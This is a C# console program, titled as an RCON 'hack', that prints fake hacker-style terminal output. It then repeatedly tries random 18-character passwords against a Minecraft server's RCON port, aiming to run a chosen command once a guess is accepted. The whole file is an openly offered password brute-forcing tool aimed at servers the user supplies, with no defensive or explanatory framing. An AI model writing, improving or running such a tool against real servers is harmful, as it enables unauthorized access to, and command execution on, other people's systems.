using System;
using System.Collections.Generic;
using System.Data;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using MinecraftServerRCON;

namespace NEWRconHackBySoupCS
{
    class Program
    {
        static void Main(string[] args)
        {
            ///port generating
            //var chars2 = "0123456789";
            //var stringChars2 = new char[5];
            //var random2 = new Random();

            //for (int i = 0; i < stringChars2.Length; i++)
            //{
            //    stringChars2[i] = chars2[random2.Next(chars2.Length)];
            //}

            //var finalport = new String(stringChars2);

            ///process
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine(Environment.UserName + "@root:~$ ");
            Thread.Sleep(150);
            Console.WriteLine(Environment.UserName + "@root:~$ cd /NEWRconHackBySoupCS/");
            Thread.Sleep(150);
            Console.WriteLine(Environment.UserName + "@root:~$ ~/NEWRconHackBySoupCS$ cd bruteforcer/");
            Thread.Sleep(150);
            Console.WriteLine(Environment.UserName + "@root:~$ ~/NEWRconHackBySoupCS/bruteforcer$ ./start1");
            Thread.Sleep(150);
            Console.Write("Host: ");
            String Host = Console.ReadLine();
            Console.Write("Port: ");
            String Port = Console.ReadLine();
            int portik = int.Parse(Port);
            Console.Write("Command: ");
            String cmds = Console.ReadLine();
            Console.WriteLine("Starting: /NEWRconHackBySoupCS/bruteforcer/start1" + " -" + Host + " -" + Port);
            Thread.Sleep(150);
            Console.WriteLine("Started: /NEWRconHackBySoupCS/bruteforcer/start1" + " -" + Host + " -" + Port);
            Thread.Sleep(150);
            Console.WriteLine(Environment.UserName + "@root:~$ ~/NEWRconHackBySoupCS/bruteforcer$ ./start2 -save -settings data.txt");
            Thread.Sleep(150);
            Console.WriteLine("Saving: /NEWRconHackBySoupCS/bruteforcer/start2 -save -settings data.txt");
            Thread.Sleep(150);
            Console.WriteLine("Saved: /NEWRconHackBySoupCS/bruteforcer/start2 -save -settings data.txt");
            Thread.Sleep(150);
            Console.WriteLine(Environment.UserName + "@root:~$ ~/NEWRconHackBySoupCS/bruteforcer$ ./Brute-Password -start -settings data.txt");
            Thread.Sleep(150);
            Console.WriteLine("Started: /NEWRconHackBySoupCS/bruteforcer/Brute-Password -start -settings data.txt");
            Thread.Sleep(150);

            while (true)
            {
            ///password generating
            passss:
                var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
                var stringChars = new char[18];
                var random = new Random();
                for (int i = 0; i < stringChars.Length; i++)
                {
                    stringChars[i] = chars[random.Next(chars.Length)];
                }
                var Pass = new String(stringChars);

                ///Connect using generates password
                using (var rcon = RCONClient.INSTANCE)
                {
                    try
                    {
                        Console.Clear();
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("Process: /NEWRconHackBySoupCS/bruteforcer/Brute-Password -start -generator -alpha-numeric");
                        Console.WriteLine("Current password: " + Pass);
                        rcon.setupStream(Host, portik, Pass);
                        rcon.sendMessage(RCONMessageType.Command, cmds);
                    }
                    catch
                    {
                        goto passss;
                    }
                }
            }
        }
    }
}
